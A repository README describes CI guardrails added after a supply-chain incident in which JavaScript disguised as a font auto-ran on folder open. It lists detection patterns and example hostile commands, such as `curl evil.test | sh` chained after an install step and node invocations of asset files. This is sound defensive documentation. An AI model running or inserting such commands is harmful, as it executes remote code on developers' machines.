# Supply-Chain Guardrails

These guardrails exist because of a supply-chain incident on 2026-10-18 in
which obfuscated JavaScript was committed to this repository masquerading as a
font asset (`public/fonts/fa-solid-500.woff2`, byte-identical to
`dist/setup.js`), along with a `.vscode/tasks.json` task that ran it
automatically when the folder was opened. The payload was live on `main` and
in tags `v2.6.0` / `v2.7.0` for roughly 18 days.

Cleanup is tracked in #483. These guardrails are the preventive layer.

## Jobs

Five jobs run on every push to `main` / `feat/*` and every PR targeting
`main`, in parallel with the existing pipeline. None of them declare `needs`,
so they cannot be skipped by a fast path.

| Job | Purpose |
|---|---|
| `asset-integrity` | Every tracked font asset must carry the signature of its own format |
| `vscode-config-guard` | Reject committed VS Code configuration that auto-runs commands on folder open |
| `devcontainer-guard` | Reject dev-container configuration that auto-runs risky commands |
| `npm-lifecycle-guard` | Reject `package.json` lifecycle hooks that execute binaries/assets or fetch code |
| `guardrail-tests` | Run the fixture suite and the incident-payload regression |

All five are stdlib-Python only: no network, no Rust toolchain, no extra
actions beyond `checkout`.

## Guard A — `scripts/guard/guard_assets.py`

Enumerates tracked files with `git ls-files -z` (NUL-delimited, so filenames
containing spaces are handled) and validates the signature of each supported
format:

| Format | Check |
|---|---|
| `.woff2` | `wOF2` at offset 0 |
| `.woff` | `wOFF` at offset 0 |
| `.ttf` | `00 01 00 00`, `true`, or `ttcf` |
| `.otf` | `OTTO` or `00 01 00 00` |
| `.eot` | `4c 50` at offset 34, plus internal size field vs actual file size |
| `.svg` | XML parse + root element is `<svg>` (never a 5-byte prefix) |

Fails with a clear message when an extension/content mismatch is found, a
tracked file is missing from the working tree, or input is invalid. Never
executes or evaluates the content under inspection.

### Limitations

- A valid signature is **not** proof that a file is safe, complete, or even a
  usable font. The guard detects gross format mismatch (e.g. JavaScript stored
  as `.woff2`); it does not decompress, render, or decode.
- It is **not** a malware scanner. Obfuscated JavaScript committed as
  `evil.js` is not caught.
- Only the six extensions above are inspected. Any other binary asset type
  needs a new signature entry.

## Guard B — `scripts/guard/guard_vscode_config.py`

Parses `.vscode/tasks.json` and `.vscode/settings.json` as JSONC (comments and
trailing commas stripped with string-literal awareness) and applies
**structural** rules:

`tasks.json`

* any task with `runOptions.runOn == "folderOpen"` → error
* any task with a legacy flat `runOn == "folderOpen"` → error
* `task.allowAutomaticTasks == true` → error

`settings.json`

* `task.allowAutomaticTasks == true` → error
* top-level `runOn == "folderOpen"` → error
* a stray top-level `tasks` object carrying task-definition fields
  (`command`/`label`/`type`/`dependsOn`) → error; tasks belong in `tasks.json`

Deliberately **not** rules, to avoid false positives:

* a property whose name merely contains `"tasks"` (e.g. `myTasks.enabled`)
* the string `"folderOpen"` appearing in an unrelated value
* text inside comments or trailing commas

### Known false positives

Any `runOn: folderOpen` task is flagged, including a benign
`npm run lint` folderOpen task. This is intentional: every folder-open task is
a supply-chain risk, so none is exempted. If a legitimate folder-open task is
ever needed, add a narrowly-scoped allow-list entry rather than widening the
rule.

### Limitations

* Only `.vscode/tasks.json` and `.vscode/settings.json` are inspected.
  User-level settings, `*.code-workspace` files, and extension-contributed
  tasks are outside the repository and cannot be reviewed here.
* Tasks defined by extensions, `dependsOn` chains, or `runOn` expressed via a
  variable cannot be resolved statically.
* Parsing is JSONC-by-stripping; exotic JSONC extensions are rejected, not
  silently accepted.
* This guard does not claim to cover all ways code can execute. It targets the
  specific configuration surface used in the incident.

## Guard C — `scripts/guard/guard_devcontainer.py`

Preventive guard: this repository currently contains **no** `.devcontainer/`
directory, so in production the guard prints `inspected 0 devcontainer file(s)`
and exits 0. Its effectiveness is verified by fixtures only — no live target
exists. It becomes active the moment a `devcontainer.json` is added.

Inspected files: `.devcontainer/devcontainer.json`, top-level
`.devcontainer.json`, and `devcontainer.json` inside any named folder under
`.devcontainer/`. Parsed as JSONC (comments and trailing commas accepted).

Flags:

* `postCreateCommand` / `postStartCommand` / `postAttachCommand` /
  `onCreateCommand` / `initializeCommand` / `updateContentCommand` whose body
  pipes a network fetch into a shell (`curl … | sh`, `wget … | bash`,
  `Invoke-WebRequest … | iex`)
* hooks that execute a **binary/asset path** rather than a manifest
  (`node ./public/fonts/x.woff2`, `sh ./dist/setup.js`, `node ./tools/x.js`).
  A `./` prefix is **not** required: `node dist/setup.js`,
  `node public/fonts/x.js`, `node assets/bootstrap.mjs` are flagged too.
  Interpreter flags (`node --no-warnings ./public/fonts/x.woff2`), full
  interpreter paths (`/usr/bin/node ./public/fonts/x.woff2`), nested
  directories (`node app/dist/setup.js`), and traversal
  (`node ./scripts/../dist/setup.js`) are all flagged as well.
* `remoteUser`/`containerUser: root` **combined with** any exec hook
  (root alone is not flagged — a root-only devcontainer passes)

Explicitly allowed without error (documented allow-list, fixture-locked):
`npm ci`, `yarn install`, `pnpm install`, `bun install`, `pip install`,
`cargo build/check/fmt/clippy/test`, `rustup component add`,
`apt-get update/install`, `sudo apt-get update/install`.

The allow-list **does not short-circuit the danger checks**: every hook is
scanned for the patterns below regardless of whether its first command is
allow-listed, so `npm ci && curl evil.test | sh` is flagged. The allow-list
only suppresses the "unfamiliar command" noise for known-good single
commands.

Hook value forms accepted per the devcontainer spec: **string**, **array**
(each element scanned individually; arrays execute directly via `exec`, so
`argv[0]`+`argv[1]` are also recombined for asset-path detection), and
**object** — a named-command object. The devcontainer CLI accepts named
commands under *any* property key (e.g. `"command"`, `"setup"`, …), so every
string/array value in the object is normalized and scanned; a `"command"` key
does not hide a dangerous sibling.

An array-form hook must contain **only strings**. Malformed elements
(`42`, `null`, a nested object, a nested array) are **not** stringified into
command text — they fail closed with a diagnostic naming the offending type
(`postCreateCommand array-form command has an unsupported element of type
int`), so a malicious command cannot hide behind a non-string element. Empty
named-command objects and non-string command values likewise fail loud.

### Known false positives

None known for the documented allow-list. A genuinely novel but benign
bootstrap command is *not* flagged by default — only the danger patterns
below cause failure, so unfamiliar-but-safe commands pass silently. The
remedy for a false positive is to narrow the danger pattern, not to widen
an allow-list.

### Limitations

* Does not inspect `Dockerfile` instructions (`RUN`, `ENTRYPOINT`) referenced
  by the dev container image build.
* Commands are matched by pattern, not interpreted; an obfuscated payload
  that avoids every pattern below will pass. The patterns are chosen to
  cover the shapes used in the incident and their common variants, not to
  be exhaustive.
* Does not cover user-level dev-container overrides or extension-contributed
  tasks.

## Guard D — `scripts/guard/guard_npm_lifecycle.py`

Preventive guard: this repository currently contains **no** `package.json`
(pure Rust workspace), so in production the guard prints
`inspected 0 package.json file(s)` and exits 0. Effectiveness is verified by
fixtures only.

Enumerates tracked `package.json` files via `git ls-files -z`, **excluding
`tests/guard/fixtures/`** for the same reason as Guard A. Inspects only the
lifecycle keys `preinstall`, `install`, `postinstall`, `prepare`, `prepublish`,
`prepublishOnly` — ordinary `scripts.build`/`scripts.test` entries are not
examined.

Flags hooks that:

* execute a **binary/asset path** (`node ./dist/setup.js`,
  `node ./public/fonts/<file>`, `node ./tools/x.js` outside `scripts/`).
  Interpreter flags (`node --no-warnings ./public/fonts/x.woff2`), full
  interpreter paths (`/usr/bin/node ./public/fonts/x.woff2`), nested
  directories (`node app/dist/setup.js`), and traversal
  (`node ./scripts/../dist/setup.js`) are all flagged as well.
* perform a network fetch at install time (`curl`, `wget`,
  `Invoke-WebRequest`, `irm`)
* use obfuscation markers (`eval(`, `atob(`) or a decodable base64 blob
  longer than 120 characters

Explicitly allowed without error (documented, fixture-locked): `husky
install`, `pinst enable/disable`, `patch-package`, `npm run <script>`,
`yarn/pnpm run`, `node-gyp`, `tsc`, `lerna run`, `corepack`, `node
./scripts/<file>.js`, plain `echo` / `exit 0` / `true`.

The allow-list **does not short-circuit the danger checks**: every lifecycle
hook is scanned for the patterns below regardless of whether it starts with
an allow-listed command, so `husky install && curl evil.test | sh` is
flagged. The allow-list only suppresses noise for known-good single
commands.

`node [flags] <path>.js` invocations are additionally resolved and the
referenced local script is scanned for the same danger patterns (shell
network fetch, JavaScript network fetch — `fetch(`, `require('https')`,
`axios.get(` —, `eval(`/`atob(`, base64 blobs, asset-path execution).
Supported flags before the path are short/long options, with or without an
`=value` (e.g. `--no-warnings`, `--max-old-space-size=4096`); a flag is never
mistaken for the script path. The allow-listed spelling of a local script is
not by itself a safety claim. A relative reference that escapes the package
directory, or an absolute/`~` reference that cannot be resolved, fails
closed. This is **not** a JavaScript malware
detector — it catches the shapes the lifecycle-command scan catches plus the
common JS fetch idioms, not arbitrary malicious logic.

### Known false positives

None known for the documented allow-list. Unfamiliar-but-benign commands
(for example `simple-git-hooks`) are *not* flagged by default — only the
danger patterns below cause failure. The remedy for a false positive is to
narrow a danger pattern, not to widen an allow-list.

### Limitations

* Does not cover `.npmrc`, `.yarnrc`, lockfile injection, or
  `prepack`/`postpack` (pack-time, not install-time).
* Pattern-based; not a semantic shell interpreter. An obfuscated payload
  that avoids every pattern below will pass (for example a payload built
  via shell command substitution rather than `eval(`).
* The local-script content check (item 5) is shallow: it scans only the
  same danger patterns used for the lifecycle command itself, plus the
  common JavaScript fetch idioms (`fetch(`, `require('https')`,
  `axios.get(`). It does not statically analyze JavaScript semantics,
  resolve `require`/`import` chains, or evaluate conditional execution.

## Tests

`tests/guard/run_fixture_tests.sh` asserts exit codes and error messages
against synthetic fixtures (generated in-tree by
`tests/guard/fixtures/make_*.py`; all inert — header stubs padded with `0x00`,
no JavaScript, no payload bytes).

`tests/guard/test_incident_payload.py` reads the historical payload blob from
Git object storage **as static bytes only** — never written to disk, never
executed, never deobfuscated — and asserts that it does not carry a valid
`wOFF2` signature and that Guard A rejects it. The test skips (not fails) when
the blob is not reachable in the clone.

Run locally:

```bash
bash tests/guard/run_fixture_tests.sh
python3 tests/guard/test_incident_payload.py
```

## Scope decision

The current `.vscode/settings.json` on `main` is clean (no
`task.allowAutomaticTasks`, no `tasks` block), so Guard B passes without any
exceptions. If a legitimate configuration is ever rejected, the correct response
is to audit that case and add the narrowest justifiable allowance — not to
weaken the rule.

Guards C and D are **preventive**: this repository has no `.devcontainer/`
and no `package.json`, so they inspect zero files today. They are documented as
fixture-verified controls rather than live controls; neither claims to have
caught anything in this repository.

CI hardening added with these guards: workflow-level `permissions:
contents: read` (default read-only for all jobs) and
`persist-credentials: false` on every `actions/checkout` step, so a
compromised step or fork PR cannot exfiltrate or persist `GITHUB_TOKEN`.
